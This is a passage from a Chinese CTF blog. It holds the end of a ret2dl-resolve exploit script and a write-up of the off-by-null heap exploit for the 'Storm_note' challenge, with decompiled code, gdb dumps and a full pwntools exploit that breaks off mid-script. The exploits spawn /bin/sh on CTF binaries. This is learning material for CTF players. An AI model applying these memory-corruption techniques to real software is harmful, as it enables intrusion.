<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./main'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./main'</span>)</span><br><span class="line"><span class="comment">#r = remote("",)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line">rel_plt_addr = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym_addr = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr_addr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x804a300</span> <span class="comment"># readelf -S main =&gt; .bss</span></span><br><span class="line">DYN_RESOL_PLT = <span class="number">0x8048380</span> <span class="comment"># readelf -S main =&gt; .plt</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># ROPgadget --binary main --only "leave|ret"</span></span><br><span class="line"></span><br><span class="line">fake_rel_plt_addr = bss_addr</span><br><span class="line">fake_dynsym_addr = fake_rel_plt_addr + <span class="number">0x8</span></span><br><span class="line">fake_dynstr_addr = fake_dynsym_addr + <span class="number">0x10</span></span><br><span class="line">bin_sh = fake_dynstr_addr + <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">FAKE_REL_OFF = fake_rel_plt_addr - rel_plt_addr</span><br><span class="line">r_info = (((fake_dynsym_addr - dynsym_addr)/<span class="number">0x10</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">str_off = fake_dynstr_addr - dynstr_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">108</span> + p32(bss_addr - <span class="number">20</span>) + p32(elf.plt[<span class="string">'read'</span>]) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_addr - <span class="number">20</span>) + p32(<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'!\n'</span>)</span><br><span class="line">r.sendline(payload) <span class="comment"># stack immigration</span></span><br><span class="line"></span><br><span class="line">fake_rel_plt = p32(elf.got[<span class="string">'read'</span>])+p32(r_info)</span><br><span class="line">fake_dynsym = p32(str_off) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12000000</span>)</span><br><span class="line">fake_dynstr = <span class="string">"system\x00/bin/sh\x00\x00"</span></span><br><span class="line"></span><br><span class="line">payload2 = p32(<span class="number">0x0</span>) + p32(DYN_RESOL_PLT) + p32(FAKE_REL_OFF) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh) + fake_rel_plt + fake_dynsym + fake_dynstr</span><br><span class="line"></span><br><span class="line">r.sendline(payload2) <span class="comment"># construct a fake structure</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="0x02：总结"><a href="#0x02：总结" class="headerlink" title="0x02：总结"></a>0x02：总结</h1><p>这个脚本可以保存一份，以后遇到类似的题目可以直接套用脚本</p>
<p>参考链接：<br><a href="https://bbs.pediy.com/thread-227034.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-227034.htm</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>题目篇</category>
        <category>PWN</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>ret2-resolve</tag>
      </tags>
  </entry>
  <entry>
    <title>off-by-one</title>
    <url>/2019/05/05/off-by-one/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>off-by-one是堆溢出中比较有意思的一类漏洞，漏洞主要原理是 malloc 本来分配了0x20的内存，结果可以写 0x21 字节的数据，多写了一个，影响了下一个内存块的头部信息，进而造成了被利用的可能，这里就以西湖论剑的一道题目来讲解这个漏洞</p>
<h1 id="0x01：例子"><a href="#0x01：例子" class="headerlink" title="0x01：例子"></a>0x01：例子</h1><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="http://file.eonew.cn/ctf/pwn/Storm_note" target="_blank" rel="noopener">http://file.eonew.cn/ctf/pwn/Storm_note</a></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先检测一下程序检测，该开的都开了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Thunder_J@Thunder_J-virtual-machine:~/桌面$ checksec Storm_note </span><br><span class="line">[*] <span class="string">'/home/Thunder_J/\xe6\xa1\x8c\xe9\x9d\xa2/Storm_note'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>
<p>首先用IDA观察一下程序，有delete_note，backdoor，alloc_note，edit_note四个功能<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      _isoc99_scanf(<span class="string">"%d"</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">666</span> )</span><br><span class="line">        backdoor();</span><br><span class="line">LABEL_15:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      alloc_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      edit_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="init-proc"><a href="#init-proc" class="headerlink" title="init_proc"></a>init_proc</h3><p>程序执行之前有这个初始化函数，可以看到关闭了 fastbin 机制<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> init_proc()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !mallopt(<span class="number">1</span>, <span class="number">0</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( mmap((<span class="keyword">void</span> *)<span class="number">0xABCD0000</span>LL, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L) != (<span class="keyword">void</span> *)<span class="number">2882338816L</span>L )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  result = read(fd, (<span class="keyword">void</span> *)<span class="number">0xABCD0100</span>LL, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">48</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="alloc-note"><a href="#alloc-note" class="headerlink" title="alloc_note"></a>alloc_note</h3><p>可以看到输入size之后，程序会calloc一块内存(calloc类比malloc)，存放note，而note_size则存放在note后面<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span> &amp;&amp; note[i]; ++i )</span><br><span class="line">  ;</span><br><span class="line"><span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"full!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"size ?"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">0xFFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    note[i] = <span class="built_in">calloc</span>(v1, <span class="number">1u</span>LL);</span><br><span class="line">    note_size[i] = v1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid size"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>note存放信息如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bss:<span class="number">0000000000202060</span> ?? ?? ?? ?? ?? ??+note_size dd <span class="number">10</span><span class="function">h <span class="title">dup</span><span class="params">(?)</span>       </span>; DATA XREF: alloc_note+E1↑o</span><br><span class="line">.bss:<span class="number">0000000000202060</span> ?? ?? ?? ?? ?? ??+                              ; edit_note+<span class="number">8</span>E↑o</span><br><span class="line">.bss:<span class="number">0000000000202060</span> ?? ?? ?? ?? ?? ??+                              ; delete_note+BE↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0                   <span class="keyword">public</span> note</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0                   ; _QWORD note[<span class="number">16</span>]</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+note dq <span class="number">10</span><span class="function">h <span class="title">dup</span><span class="params">(?)</span>            </span>; DATA XREF: alloc_note+<span class="number">2</span>D↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+                              ; alloc_note+C6↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+                              ; edit_note+<span class="number">57</span>↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+                              ; edit_note+A8↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+                              ; edit_note+D0↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+                              ; delete_note+<span class="number">57</span>↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+                              ; delete_note+<span class="number">82</span>↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+                              ; delete_note+A2↑o</span><br><span class="line">.bss:<span class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+_bss ends</span><br></pre></td></tr></table></figure></p>
<h3 id="edit-note"><a href="#edit-note" class="headerlink" title="edit_note"></a>edit_note</h3><p>edit 从 note 和 note_size 中根据索引取出需要编辑的堆块的指针和 size，使用 read 函数来进行输入。之后将末尾的值赋值为 0，这里存在 off by null 漏洞。<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Index ?"</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">15</span> &amp;&amp; note[v1] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  v2 = read(<span class="number">0</span>, (<span class="keyword">void</span> *)note[v1], (<span class="keyword">signed</span> <span class="keyword">int</span>)note_size[v1]);</span><br><span class="line">  *(_BYTE *)(note[v1] + v2) = <span class="number">0</span>; <span class="comment">// off-by-one</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h3><p>可以看到输入 index 之后程序 free 掉 note 和 note_size 之后做了清零操作，不存在UAF漏洞<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Index ?"</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">15</span> &amp;&amp; note[v1] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)note[v1]);</span><br><span class="line">  note[v1] = <span class="number">0L</span>L;</span><br><span class="line">  note_size[v1] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h3><p>可以看到system(“/bin/sh”);函数，函数首先读 0x30 长度，然后输入的内容和 mmap 段映射的内容相同即 getshell<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"If you can open the lock, I will let you in"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;buf, (<span class="keyword">const</span> <span class="keyword">void</span> *)<span class="number">0xABCD0100</span>LL, <span class="number">0x30</span>uLL) )</span><br><span class="line">  system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping/" target="_blank" rel="noopener">Chunk Extend</a> 使得chunk重叠</li>
<li>控制chunk</li>
<li>控制unsort bin和large bin</li>
<li>overlapping 伪造 fake_chunk</li>
<li>触发后门</li>
</ul>
<p>这里首先我们连续申请7块chunk，这里是三个一组，两组 chunk 中的中间一个大的 chunk 就是我们利用的目标，用它来进行 overlapping 并把它放进 largebin 中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 0</span></span><br><span class="line">alloc_note(<span class="number">0x508</span>)  <span class="comment"># 1</span></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 3</span></span><br><span class="line">alloc_note(<span class="number">0x508</span>)  <span class="comment"># 4</span></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 6</span></span><br></pre></td></tr></table></figure>
<p>布局如下图</p>
<p><img src="https://img-blog.csdnimg.cn/20190416222922114.png" alt="在这里插入图片描述"></p>
<p>然后我们伪造 prev_size<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 改pre_size为0x500</span></span><br><span class="line">edit_note(<span class="number">1</span>, <span class="string">'a'</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))</span><br></pre></td></tr></table></figure></p>
<p>调试可以看到<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/30gx 0x55dc2ede84f0</span><br><span class="line">0x55dc2ede84f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55dc2ede8500:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55dc2ede8510:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55dc2ede8520:	0x0000000000000500	0x0000000000000000 =&gt; fake prev_size</span><br><span class="line">0x55dc2ede8530:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55dc2ede8540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55dc2ede8550:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55dc2ede8560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55dc2ede8570:	0x0000000000000000	0x0000000000000511</span><br><span class="line">0x55dc2ede8580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55dc2ede8590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55dc2ede85a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55dc2ede85b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55dc2ede85c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55dc2ede85d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>释放掉chunk 1至unsort bin然后创建chunk 0来触发off by null，这里选择 size 为 0x18 的目的是为了能够填充到下一个 chunk 的 prev_size，这里就能通过溢出 00 到下一个 chunk 的 size 字段，使之低字节覆盖为 0。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># off by null 将1号块的size字段覆盖为0x500</span></span><br><span class="line">edit_note(<span class="number">0</span>, <span class="string">'b'</span>*(<span class="number">0x18</span>))</span><br></pre></td></tr></table></figure></p>
<p>调试可以看到chunk1已经被放进了 unsorted bin<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x562071ea0020-32</span><br><span class="line">0x562071ea0000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562071ea0010:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x562071ea0020:	0x6262626262626262	0x0000000000000500</span><br><span class="line">0x562071ea0030:	0x00007fe9f2875b78	0x00007fe9f2875b78</span><br><span class="line">0x562071ea0040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562071ea0050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x562071ea0060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x562071ea0070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x562071ea0080:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x562071ea0090:	0x6161616161616161	0x6161616161616161</span><br></pre></td></tr></table></figure></p>
<p>接下来我们申请两块chunk，因为关闭了 fastbin 机制，所以会从unsorted bin上，然后delete掉它们，那么就会触发这两个堆块合并，从而覆盖到刚刚的 0x4d8 这个块<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc_note(<span class="number">0x18</span>)</span><br><span class="line">alloc_note(<span class="number">0x4d8</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">2</span>)  <span class="comment"># unlink进行前向extend</span></span><br></pre></td></tr></table></figure></p>
<p>调试如下，index为7的指向的地方和unsortedbin里面的chunk已经重叠了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x5564795ff000</span><br><span class="line">0x5564795ff000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5564795ff010:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x5564795ff020:	0x6262626262626262	0x0000000000000531</span><br><span class="line">0x5564795ff030:	0x00007f8305be4b78	0x00007f8305be4b78</span><br><span class="line">0x5564795ff040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5564795ff050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5564795ff060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5564795ff070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5564795ff080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5564795ff090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>alloc_note(0x30)之后2号块与7号块交叠，这里 add(0x30) 的 size 为 0x30 的原因是只需要控制 chunk7 的 fd 和 bk 指针<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">alloc_note(0x30)  <span class="comment"># 1</span></span><br><span class="line">alloc_note(0x4e8)  <span class="comment"># 2</span></span><br></pre></td></tr></table></figure></p>
<p>接下来的原理同上<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit_note(<span class="number">4</span>, <span class="string">'a'</span>*(<span class="number">0x4f0</span>) + p64(<span class="number">0x500</span>))</span><br><span class="line">delete_note(<span class="number">4</span>)</span><br><span class="line">edit_note(<span class="number">3</span>, <span class="string">'a'</span>*(<span class="number">0x18</span>))</span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 4</span></span><br><span class="line">alloc_note(<span class="number">0x4d8</span>)  <span class="comment"># 8</span></span><br><span class="line">delete_note(<span class="number">4</span>)</span><br><span class="line">delete_note(<span class="number">5</span>)</span><br><span class="line">alloc_note(<span class="number">0x40</span>)  <span class="comment"># 4</span></span><br></pre></td></tr></table></figure></p>
<p>接下来需要我们控制 unsort bin 和 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/#large-bin" target="_blank" rel="noopener">large bin</a><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line">alloc_note(<span class="number">0x4e8</span>)    <span class="comment"># 2</span></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></p>
<p>由于unsorted bin是FIFO（队列模式），所以可以先删除2号块，再申请他，由于先检查队列尾部，也就是原先4号块的chunk部分，发现chunk大小不够大，然后将其放入large bin中。该chunk由8号块控制。然后，继续删除2号块，那么此时unsorted bin里还剩下2号块，该部分通过7号块来控制。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x55609685a000</span><br><span class="line">0x55609685a000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55609685a010:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x55609685a020:	0x6262626262626262	0x0000000000000041</span><br><span class="line">0x55609685a030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a060:	0x0000000000000000	0x00000000000004f1 =&gt; chunk 2</span><br><span class="line">0x55609685a070:	0x00007fec67d73b78	0x00007fec67d73b78 =&gt; unsorted bin</span><br><span class="line">0x55609685a080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">gdb-peda$ x/20gx 0x55609685a570</span><br><span class="line">0x55609685a570:	0x6161616161616161	0x0000000000000051</span><br><span class="line">0x55609685a580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a5a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a5b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a5c0:	0x0000000000000000	0x00000000000004e1 =&gt; chunk 5</span><br><span class="line">0x55609685a5d0:	0x00007fec67d73f98	0x00007fec67d73f98</span><br><span class="line">0x55609685a5e0:	0x000055609685a5c0	0x000055609685a5c0</span><br><span class="line">0x55609685a5f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a600:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>接下来我们伪造 fake_chunk，通过 chunk7 控制 chunk2<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content_addr = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk =  content_addr - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>)    <span class="comment"># size</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(fake_chunk)         <span class="comment"># bk</span></span><br><span class="line">edit_note(<span class="number">7</span>,payload)</span><br></pre></td></tr></table></figure></p>
<p>同样的通过 edit(8) 来控制 chunk5<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>)    <span class="comment"># size </span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)       </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>) </span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">8</span>,payload2)</span><br></pre></td></tr></table></figure></p>
<p>接下来我们需要触发后门<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit_note(<span class="number">2</span>, p64(<span class="number">0</span>) * <span class="number">8</span>)</span><br><span class="line">sh.sendline(<span class="string">'666'</span>)</span><br><span class="line">sh.sendline(<span class="string">'\x00'</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
<p>exp如下<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./Storm_note'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./Storm_note'</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc_note</span><span class="params">(size)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_note</span><span class="params">(idx, mes)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">'Content'</span>)</span><br><span class="line">    r.send(mes)</span><br><span class="line">    r.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line"></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 0</span></span><br><span class="line">alloc_note(<span class="number">0x508</span>)  <span class="comment"># 1</span></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 3</span></span><br><span class="line">alloc_note(<span class="number">0x508</span>)  <span class="comment"># 4</span></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">1</span>, <span class="string">'a'</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">edit_note(<span class="number">0</span>, <span class="string">'b'</span>*(<span class="number">0x18</span>))</span><br><span 